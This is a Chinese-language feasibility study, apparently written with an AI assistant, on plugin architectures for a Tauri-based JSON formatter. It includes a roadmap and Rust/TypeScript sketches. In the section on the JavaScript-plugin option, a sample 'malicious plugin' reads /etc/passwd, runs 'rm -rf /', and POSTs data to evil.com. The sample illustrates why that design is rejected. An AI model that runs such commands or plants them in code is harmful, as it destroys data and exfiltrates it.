# JSON Formatter & Validator 插件系统技术可行性研究

> **文档日期**: 2025-10-24
> **项目版本**: v0.1.0
> **结论**: 技术可行，但需谨慎规划

---

## 一、研究背景

在 v0.1.0 发布后，评估为 JSON 工具添加插件系统的技术可行性，以支持未来的功能扩展需求。

---

## 二、当前架构分析

### 2.1 技术栈

```
Frontend (React + TypeScript)
    ↓ invoke()
Backend (Rust + Tauri 2.9)
    ├─ validate_json
    ├─ format_json
    ├─ minify_json
    ├─ import/export
    └─ logging system
```

### 2.2 核心特点

- ✅ 前后端清晰分离（Tauri IPC）
- ✅ 已有 Tauri command 机制
- ✅ 基础设施完善（日志、偏好存储、主题系统）
- ❌ 所有功能都是编译时固定
- ❌ 缺乏扩展点

---

## 三、Tauri 插件系统限制

基于对 Tauri v2 插件系统的研究，发现以下技术约束：

### ❌ 不支持的功能

1. **运行时动态加载 Rust 插件** - Rust 是编译型语言，无法在运行时加载 `.so`/`.dylib`
2. **用户安装第三方插件** - 缺乏安全沙箱机制
3. **浏览器扩展式插件市场** - WebView 本身不支持 Chrome Extension API
4. **热重载插件** - 需要重启应用

### ✅ 支持的功能

1. **编译时插件** - 作为 Cargo crate 在编译时链接
2. **内置扩展系统** - 通过配置文件激活/禁用功能
3. **JavaScript 层扩展** - 通过 `initialization_script` 或 `eval()` 注入（有安全风险）
4. **配置驱动的处理器** - 注册机制 + 动态路由

---

## 四、三种可行架构方案

### 方案 1：编译时插件系统（最安全）

#### 架构设计

```rust
// 插件特质定义
trait JsonProcessor: Send + Sync {
    fn name(&self) -> &str;
    fn process(&self, input: &str) -> Result<String, String>;
    fn description(&self) -> &str;
}

// 插件示例
struct Base64Plugin;
impl JsonProcessor for Base64Plugin {
    fn name(&self) -> &str { "base64" }
    fn process(&self, input: &str) -> Result<String, String> {
        // 实现 Base64 编码/解码
    }
    fn description(&self) -> &str { "Base64 编解码" }
}

// 插件注册表
struct PluginRegistry {
    processors: HashMap<String, Box<dyn JsonProcessor>>,
}

// 在应用启动时注册
fn setup_plugins() -> PluginRegistry {
    let mut registry = PluginRegistry::new();
    registry.register(Box::new(Base64Plugin));
    registry.register(Box::new(SchemaValidatorPlugin));
    registry
}
```

#### 优缺点分析

| 维度 | 评价 |
|------|------|
| **类型安全** | ✅ 编译时检查，完全类型安全 |
| **性能** | ✅ 零运行时开销 |
| **安全性** | ✅ 所有代码都经过审核 |
| **测试性** | ✅ 容易编写单元测试 |
| **灵活性** | ❌ 需要重新编译才能添加插件 |
| **用户扩展** | ❌ 用户无法自定义插件 |

#### 适用场景

- 内置功能模块化
- 通过 Cargo features 控制编译选项
- 企业/团队内部定制版本

---

### 方案 2：JavaScript 扩展层（最灵活，有风险）

#### 架构设计

```typescript
// 插件接口定义
interface JsonPlugin {
  id: string;
  name: string;
  version: string;
  description: string;
  process: (input: string) => Promise<string>;
}

// 插件加载器
class PluginLoader {
  private plugins = new Map<string, JsonPlugin>();

  async loadFromFile(path: string) {
    const code = await readTextFile(path);
    // ⚠️ 安全风险：eval 执行用户代码
    const plugin = new Function('return ' + code)() as JsonPlugin;

    // 验证插件接口
    if (!this.validatePlugin(plugin)) {
      throw new Error('Invalid plugin');
    }

    this.plugins.set(plugin.id, plugin);
  }

  async execute(pluginId: string, input: string): Promise<string> {
    const plugin = this.plugins.get(pluginId);
    if (!plugin) throw new Error(`Plugin ${pluginId} not found`);
    return await plugin.process(input);
  }
}
```

#### 优缺点分析

| 维度 | 评价 |
|------|------|
| **用户扩展** | ✅ 用户可编写自己的插件 |
| **热重载** | ✅ 无需重启应用 |
| **开发体验** | ✅ JavaScript 开发门槛低 |
| **安全性** | ❌ **严重安全风险** - 用户代码可执行任意操作 |
| **性能** | ❌ JS 处理大 JSON 性能差 |
| **沙箱隔离** | ❌ 无法隔离恶意代码 |

#### 安全风险示例

```javascript
// 恶意插件可以做任何事情
const maliciousPlugin = {
  id: 'evil',
  name: 'Evil Plugin',
  process: async (input) => {
    // 读取敏感文件
    await readTextFile('/etc/passwd');
    // 执行任意系统命令
    await invoke('execute_command', { cmd: 'rm -rf /' });
    // 窃取数据
    await fetch('https://evil.com/steal', {
      method: 'POST',
      body: input
    });
  }
};
```

#### 结论

**⚠️ 不推荐使用此方案**，除非实现完整的沙箱隔离（WebAssembly 或独立进程）。

---

### 方案 3：混合架构（推荐）

#### 核心思想

- **Rust 端**: 实现所有处理器逻辑
- **前端**: 基于配置的处理流水线
- **配置文件**: 用户可启用/禁用、配置参数

#### 架构设计

**1. 配置文件（Tauri Store）**

```toml
[processors]
  [processors.formatter]
  enabled = true
  indent = 2
  sort_keys = false

  [processors.validator]
  enabled = true

  [processors.json_path]
  enabled = false
  default_path = "$"

  [processors.schema_validator]
  enabled = false
  schema_url = "https://example.com/schema.json"

  [processors.base64]
  enabled = true

  [processors.yaml_converter]
  enabled = false
```

**2. Rust 端实现**

```rust
// 处理器配置
#[derive(Debug, Deserialize)]
struct ProcessorConfig {
    enabled: bool,
    #[serde(flatten)]
    params: HashMap<String, serde_json::Value>,
}

// 统一的处理器调用接口
#[tauri::command]
async fn execute_processor(
    processor_id: String,
    input: String,
    config: ProcessorConfig,
) -> Result<String, String> {
    if !config.enabled {
        return Err("Processor is disabled".into());
    }

    match processor_id.as_str() {
        "formatter" => processors::format_json(&input, &config.params),
        "validator" => processors::validate_json(&input),
        "json_path" => processors::extract_json_path(&input, &config.params),
        "base64" => processors::encode_base64(&input),
        "schema_validator" => processors::validate_schema(&input, &config.params),
        "yaml_converter" => processors::json_to_yaml(&input),
        _ => Err(format!("Unknown processor: {}", processor_id)),
    }
}

// 获取所有可用处理器
#[tauri::command]
async fn list_processors() -> Result<Vec<ProcessorInfo>, String> {
    Ok(vec![
        ProcessorInfo {
            id: "formatter".into(),
            name: "JSON 格式化".into(),
            description: "美化 JSON 输出".into(),
            icon: "format_align_left".into(),
            category: "formatting".into(),
        },
        ProcessorInfo {
            id: "json_path".into(),
            name: "JSONPath 查询".into(),
            description: "使用 JSONPath 表达式查询数据".into(),
            icon: "search".into(),
            category: "query".into(),
        },
        // ... 更多处理器
    ])
}
```

**3. 前端插件管理 UI**

```typescript
interface ProcessorDefinition {
  id: string;
  name: string;
  description: string;
  icon: string;
  category: 'formatting' | 'validation' | 'conversion' | 'query';
  enabled: boolean;
  settings: Record<string, any>;
}

// 插件管理页面
const PluginManager: React.FC = () => {
  const [processors, setProcessors] = useState<ProcessorDefinition[]>([]);

  useEffect(() => {
    // 加载可用处理器
    invoke<ProcessorDefinition[]>('list_processors').then(setProcessors);
  }, []);

  const toggleProcessor = async (id: string) => {
    // 更新配置
    await preferencesService.updateProcessorConfig(id, {
      enabled: !processors.find(p => p.id === id)?.enabled
    });
  };

  return (
    <div className="plugin-manager">
      <h2>处理器管理</h2>
      {processors.map(processor => (
        <ProcessorCard
          key={processor.id}
          processor={processor}
          onToggle={() => toggleProcessor(processor.id)}
        />
      ))}
    </div>
  );
};
```

#### 优缺点分析

| 维度 | 评价 |
|------|------|
| **安全性** | ✅ 所有代码内置，完全可控 |
| **性能** | ✅ Rust 实现，性能优秀 |
| **灵活性** | ✅ 用户可自由组合、配置 |
| **可扩展性** | ✅ 开发者添加新处理器容易 |
| **用户体验** | ✅ 无需重启，配置即生效 |
| **维护性** | ✅ 统一的架构，易于维护 |
| **用户自定义** | ❌ 用户无法编写插件（需开发者实现） |
| **二进制体积** | ⚠️ 功能增多会增大体积（可通过 features 缓解） |

#### 适用场景

- ✅ 内置功能模块化
- ✅ 用户可配置的功能开关
- ✅ 渐进式功能发布（默认禁用实验性功能）
- ✅ 企业版/社区版差异化

---

## 五、推荐的处理器功能清单

### 🔥 高优先级（v0.2.0 - v0.5.0）

1. **JSONPath 查询器** - 支持 JSONPath 表达式查询
   - 语法: `$.store.books[*].author`
   - 用例: 快速提取嵌套数据

2. **JSON Schema 验证器** - 基于 JSON Schema 进行验证
   - 支持 Draft-07/2019-09/2020-12
   - 详细错误定位

3. **JSON Diff/Merge** - 对比和合并 JSON
   - 可视化差异高亮
   - 三路合并

4. **Base64 编解码** - 快速编解码
   - JSON → Base64
   - Base64 → JSON（自动检测）

5. **JWT 解码器** - 解析 JWT Token
   - Header + Payload 展示
   - 签名验证（可选）

### ⚙️ 中优先级（v0.6.0 - v1.0.0）

6. **格式转换器**
   - JSON ↔ YAML
   - JSON ↔ TOML
   - JSON ↔ XML
   - JSON ↔ CSV（扁平化）

7. **数据生成器** - Mock 数据生成
   - 基于 JSON Schema 生成样例数据
   - 支持 Faker.js 风格的数据类型

8. **JQ 集成** - 支持 jq 命令行语法
   - 内嵌 jq 引擎（通过 jq-rs）
   - 在线调试 jq 表达式

9. **数据脱敏** - 敏感数据处理
   - 自动检测手机号、邮箱、身份证
   - 可配置脱敏规则

### 💡 低优先级（v1.1.0+）

10. **GraphQL 查询器** - GraphQL 数据提取
11. **Protobuf 转换** - JSON ↔ Protobuf
12. **SQL 生成器** - 从 JSON 生成 INSERT 语句
13. **OpenAPI 验证** - 验证 API 响应是否符合 OpenAPI Schema

### ❌ 不推荐的方向

- 主题插件（已有主题系统）
- AI 辅助功能（成本高，用户会直接用 ChatGPT）
- 云同步功能（超出工具定位）
- 版本控制（Git 集成太重）

---

## 六、实施路线图

### Phase 0: 架构重构（v0.2.0）

**工期**: 2 周

**目标**: 重构现有代码，建立插件系统基础

**任务清单**:
- [ ] 抽象 `JsonProcessor` trait
- [ ] 实现 `PluginRegistry`
- [ ] 迁移现有功能到处理器架构
  - [ ] `validate_json` → `ValidatorProcessor`
  - [ ] `format_json` → `FormatterProcessor`
  - [ ] `minify_json` → `MinifierProcessor`
- [ ] 实现处理器配置存储（基于 Tauri Store）
- [ ] 添加 `execute_processor` 和 `list_processors` 命令

**验收标准**:
- ✅ 所有现有功能在新架构下正常工作
- ✅ 配置文件可持久化
- ✅ 单元测试覆盖率 > 80%

---

### Phase 1: 核心处理器（v0.3.0）

**工期**: 3 周

**目标**: 实现 5 个高频处理器

**任务清单**:
- [ ] JSONPath 查询器
  - 依赖: `serde_json_path` crate
  - 功能: 支持标准 JSONPath 语法
- [ ] JSON Schema 验证器
  - 依赖: `jsonschema` crate
  - 功能: Draft-07 支持，详细错误报告
- [ ] JSON Diff
  - 依赖: `json_patch` crate
  - 功能: RFC 6902 diff 格式
- [ ] Base64 编解码
  - 依赖: `base64` crate
  - 功能: 标准 Base64 + URL-safe Base64
- [ ] JWT 解码器
  - 依赖: `jsonwebtoken` crate
  - 功能: Header/Payload 解析，可选签名验证

**验收标准**:
- ✅ 每个处理器有完整的单元测试
- ✅ 性能基准测试（处理 1MB JSON < 100ms）
- ✅ 前端 UI 集成

---

### Phase 2: 插件管理 UI（v0.4.0）

**工期**: 1 周

**目标**: 构建插件管理界面

**任务清单**:
- [ ] 插件列表页面
  - 分类展示（格式化/验证/转换/查询）
  - 搜索过滤
- [ ] 插件启用/禁用开关
- [ ] 插件配置表单（动态生成）
- [ ] 插件使用统计（基于日志系统）

**验收标准**:
- ✅ 用户可在 UI 中管理所有处理器
- ✅ 配置更改即时生效（无需重启）
- ✅ 支持导入/导出配置

---

### Phase 3: 格式转换器（v0.5.0）

**工期**: 2 周

**目标**: 实现多格式互转

**任务清单**:
- [ ] YAML 转换器
  - 依赖: `serde_yaml` crate
  - JSON ↔ YAML
- [ ] TOML 转换器
  - 依赖: `toml` crate
  - JSON ↔ TOML
- [ ] XML 转换器
  - 依赖: `quick-xml` + `serde-xml-rs`
  - JSON ↔ XML
- [ ] CSV 转换器
  - 依赖: `csv` crate
  - JSON → CSV（扁平化）

**验收标准**:
- ✅ 支持复杂嵌套结构的转换
- ✅ 保留数据类型信息
- ✅ 错误处理完善

---

### Phase 4: 高级功能（v1.0.0）

**工期**: 3 周

**目标**: 实现高级处理器

**任务清单**:
- [ ] JQ 集成
  - 依赖: `jq-rs` crate
  - 完整 jq 语法支持
- [ ] 数据生成器
  - 依赖: `fake` crate
  - 基于 Schema 的智能生成
- [ ] 数据脱敏
  - 自动检测 + 规则引擎
  - 可配置脱敏策略

**验收标准**:
- ✅ JQ 表达式兼容 jq 命令行
- ✅ Mock 数据质量高
- ✅ 脱敏规则可自定义

---

## 七、技术债务与风险评估

### 7.1 架构风险

| 风险 | 影响 | 缓解措施 |
|------|------|----------|
| **插件 API 不稳定** | 高 - 破坏向后兼容性 | 在 v1.0.0 前谨慎设计 API，充分测试 |
| **二进制体积膨胀** | 中 - 影响下载体验 | 使用 Cargo features 条件编译，提供精简版 |
| **性能退化** | 中 - 用户体验下降 | 建立性能基准测试，每次 CI 运行 |
| **配置复杂度** | 低 - 增加学习成本 | 提供预设配置模板，智能默认值 |

### 7.2 维护成本

- **新增处理器成本**: 每个 ~2-3 天（实现 + 测试 + 文档）
- **API 变更成本**: 高 - 需要迁移现有配置
- **依赖更新成本**: 中 - 需关注 crate 安全漏洞

### 7.3 安全考虑

1. **配置注入攻击** - 验证用户输入的配置参数
2. **资源耗尽攻击** - 限制处理器执行时间和内存使用
3. **路径遍历** - 如果处理器涉及文件操作，需严格验证路径

---

## 八、替代方案：WebAssembly 插件（未来）

### 8.1 技术原理

```rust
// 宿主端：加载 WASM 插件
use wasmtime::*;

struct WasmPlugin {
    engine: Engine,
    module: Module,
}

impl WasmPlugin {
    fn load(path: &str) -> Result<Self> {
        let engine = Engine::default();
        let module = Module::from_file(&engine, path)?;
        Ok(Self { engine, module })
    }

    fn execute(&self, input: &str) -> Result<String> {
        let mut store = Store::new(&self.engine, ());
        let instance = Instance::new(&mut store, &self.module, &[])?;

        let process = instance.get_typed_func::<(u32, u32), u32>(&mut store, "process")?;
        // 调用 WASM 导出的 process 函数
        // ...
    }
}
```

### 8.2 优势

- ✅ 真正的沙箱隔离（内存/CPU 限制）
- ✅ 跨语言支持（Rust/C++/Go/AssemblyScript）
- ✅ 接近原生的性能
- ✅ 用户可安全地安装第三方插件

### 8.3 劣势

- ❌ 实现复杂度极高
- ❌ WASM 生态尚不成熟（尤其是 WASI）
- ❌ 调试困难
- ❌ 二进制体积大（需内嵌 WASM 运行时）

### 8.4 建议

**在 v2.0.0+ 评估 WASM 方案**，前提是：
1. 用户基数 > 10,000
2. 社区有强烈的自定义插件需求
3. WASM 生态更加成熟

---

## 九、决策建议

### 短期（v0.2.0 - v0.5.0）

**结论**: ❌ **不建议立即实现完整插件系统**

**理由**:
1. 项目刚发布 v0.1.0，需要先积累用户反馈
2. 插件系统的维护成本远超预期
3. 过早抽象可能导致错误的架构决策

**替代方案**:
- ✅ 直接在核心添加 3-5 个高频功能
- ✅ 使用简单的 `match` 语句路由不同功能
- ✅ 收集用户真实需求数据

**示例代码**:

```rust
// 简单的功能路由，无需复杂架构
#[tauri::command]
async fn process_json(
    operation: String,
    input: String,
    params: serde_json::Value,
) -> Result<String, String> {
    match operation.as_str() {
        "validate" => validate_json(&input),
        "format" => format_json(&input, params),
        "minify" => minify_json(&input),
        "json_path" => extract_json_path(&input, params),
        "base64_encode" => encode_base64(&input),
        _ => Err("Unknown operation".into()),
    }
}
```

---

### 中期（v1.0.0）

**结论**: ✅ **采用方案 3（混合架构）**

**前提条件**:
- 用户数 > 1,000
- 有明确的功能扩展需求
- 团队有足够的开发资源

**实施要点**:
1. 重构现有代码为处理器架构
2. 实现 10+ 个内置处理器
3. 提供插件管理 UI
4. 支持配置导入/导出

---

### 长期（v2.0.0+）

**结论**: 🤔 **评估 WASM 插件的必要性**

**评估指标**:
- [ ] 用户数 > 10,000
- [ ] 有 > 50 个用户请求自定义插件功能
- [ ] 有开发者主动贡献插件代码
- [ ] WASM 生态足够成熟

**如果指标达成**:
- 启动 WASM 插件系统 PoC
- 设计插件 API 规范
- 构建插件开发工具链
- 建立插件市场（可选）

---

## 十、总结

### 核心观点

1. **技术可行性**: ✅ 完全可行（方案 1 和方案 3）
2. **商业必要性**: ⚠️ 需谨慎评估
3. **推荐方案**: 方案 3（混合架构）
4. **实施时机**: v1.0.0（当前为 v0.1.0）

### 关键警告

> **过早优化是万恶之源。**
>
> 插件系统是复杂的架构决策，一旦实施就很难回退。在没有充分的用户需求验证前，盲目追求"可扩展性"可能导致过度工程化。
>
> **先让工具变得好用，再考虑生态建设。**

### 行动建议

- **现在**: 完善核心功能，收集用户反馈
- **v0.3.0**: 尝试简单的功能路由（无插件架构）
- **v0.5.0**: 如果功能数量 > 10，考虑重构
- **v1.0.0**: 正式实施插件系统（如果有需求）
- **v2.0.0**: 评估 WASM 插件（如果有社区生态）

---

## 附录

### A. 参考资料

- [Tauri Plugin Development Guide](https://v2.tauri.app/develop/plugins/)
- [Tauri Architecture Overview](https://v2.tauri.app/concept/architecture/)
- [JSON Schema Specification](https://json-schema.org/)
- [JSONPath Specification](https://goessner.net/articles/JsonPath/)
- [RFC 6902 - JSON Patch](https://tools.ietf.org/html/rfc6902)

### B. 相关 Issue/Discussion

- [Tauri Discussion #2685: How to load addons/extensions?](https://github.com/tauri-apps/tauri/discussions/2685)
- [Tauri Discussion #9337: Add a plugin as a part of tauri app](https://github.com/tauri-apps/tauri/discussions/9337)

### C. 技术栈依赖（如果实施）

```toml
[dependencies]
# 插件系统核心
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

# JSONPath 支持
serde_json_path = "0.6"

# JSON Schema 验证
jsonschema = "0.17"

# JSON Patch/Diff
json_patch = "1.0"

# 编解码
base64 = "0.21"
jsonwebtoken = "9.2"

# 格式转换
serde_yaml = "0.9"
toml = "0.8"
quick-xml = "0.31"
csv = "1.3"

# JQ 支持（可选）
jq-rs = "0.4"

# Mock 数据生成（可选）
fake = { version = "2.9", features = ["derive"] }

# WASM 运行时（v2.0.0+）
# wasmtime = "16.0"
```

### D. 估算工作量

| Phase | 描述 | 工期 | 人力 |
|-------|------|------|------|
| Phase 0 | 架构重构 | 2 周 | 1 人 |
| Phase 1 | 核心处理器 | 3 周 | 1-2 人 |
| Phase 2 | UI 开发 | 1 周 | 1 人 |
| Phase 3 | 格式转换 | 2 周 | 1 人 |
| Phase 4 | 高级功能 | 3 周 | 1-2 人 |
| **总计** | - | **11 周** | **1-2 人** |

---

**文档维护者**: Claude (AI Assistant)
**最后更新**: 2025-10-24
**下次评审**: v0.3.0 发布后
